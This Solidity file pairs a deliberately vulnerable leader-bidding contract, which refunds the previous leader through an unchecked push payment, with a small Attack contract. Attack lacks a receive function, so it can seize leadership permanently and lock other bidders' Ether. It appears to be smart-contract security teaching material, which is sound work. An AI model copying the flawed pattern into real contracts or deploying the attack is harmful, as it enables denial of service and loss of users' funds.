// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.19;

contract VotingLeader {

    address public Leader; //Current voting leader
    uint public PriceValue; //Current value

    constructor() { Leader = msg.sender; } //set owner address as current leader
    
    function setValue() public payable { //value setting 
        require(
        msg.value > PriceValue, "Need to select more than the current value"
        );
        (bool sent, ) = Leader.call{value: PriceValue}(""); //calling current leader address + set current value
        if (sent) {
            PriceValue = msg.value; //update value after Ether sent
            Leader = msg.sender; //update current leader
        }
    }
}

contract Attack {
    VotingLeader votingleader;
    constructor(address _votingleader) {
        votingleader = VotingLeader(_votingleader); //Initialising variable with vulnerable contract
    }
    function attack() public payable {
        votingleader.setValue{value: msg.value}(); //calling the value set and sending Ether recieved
    }
}